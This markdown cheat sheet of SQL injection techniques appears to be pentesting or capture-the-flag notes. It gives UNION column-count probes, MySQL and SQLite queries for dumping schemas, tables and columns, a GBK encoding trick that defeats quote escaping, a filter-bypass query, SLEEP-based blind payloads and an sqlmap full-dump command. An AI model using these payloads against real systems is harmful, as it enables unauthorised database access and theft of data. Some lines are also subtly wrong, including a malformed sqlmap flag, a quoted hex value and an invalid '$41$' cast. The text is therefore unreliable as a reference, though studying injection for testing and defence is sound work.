# SQL injection

## Comments
MySQL interprets `#` and `--` as the beginning of comments

## Identifying the vulnerability
Quotes are always a good way to start
### Union based
##### Identitfy the number of parameters retrieved from the legal request

```sql
0 UNION SELECT null,null                # ERROR
0 UNION SELECT null,null,null           # ERROR
0 UNION SELECT null,null,null,null      # ERROR
0 UNION SELECT null,null,null,null,null # Returns a valid response
```

### Dumping schemas
*MySQL*
```sql
SELECT DISTINCT table_schema FROM information_schema.tables;
```
### Dumping tables
*MySQL*
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='SCHEMA_NAME_HERE';
```
*SQLite3*
```sql
SELECT tbl_name FROM sqlite_master
```

### Dumping columns
*MySQL*
```sql
SELECT column_name FROM information_schema.columns WHERE table_schema='SCHEMA_NAME_HERE' AND table_name='TABLE_NAME_HERE';
```
*SQLite3*
```sql
SELECT name FROM PRAGMA_TABLE_INFO('TABLE_NAME_HERE');
```

## Concat

**Mysql**
```sql
SELECT group_concat('0x7C',username,'0x7C') FROM users;
```

# GBK

SQL injection may appears when using GBK encoding. If `'` are escaped with a `\`, we can use GBK encoding to insert a value before the `'` so the payload looks like `something\'`. 
The point is that some GBK chars are like XX5C where 5C is the hex value of `\`. 

So the injection may be interpreted as `縗'` (GBK value of 0xbf5c27 a.k.a `¿\'` in ASCII ) and so the quote is not escaped anymore



## WAF

### Bypass simple quotes
*SQLite3*
- using hex(hex()), cast and substr() functions
```sql
SELECT tbl_name FROM sqlite_master WHERE hex(substr(tbl_name,1,1))=(SELECT CAST ($41$ AS TEXT)
```

## Useful functions
```sql
group_concat()
substr("string",INDEX,LENGTH)
hex()
cast(integer AS TEXT)
cast("0123" as INT)
```


## Time based SQLi 
This happens when nothing is returned by the request.
If the request come back after a given time, it worked.

```sql
SELECT SLEEP(5);
SELECT SLEEP(5),null,null;
```


## TOOLS :
- SQLmap
It needs to capture a request with burp and put it in request.txt
```bash
sqlmap -r request.txt --dbms-mysql --dump
```
- NMap
```bash
nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 <host>
```



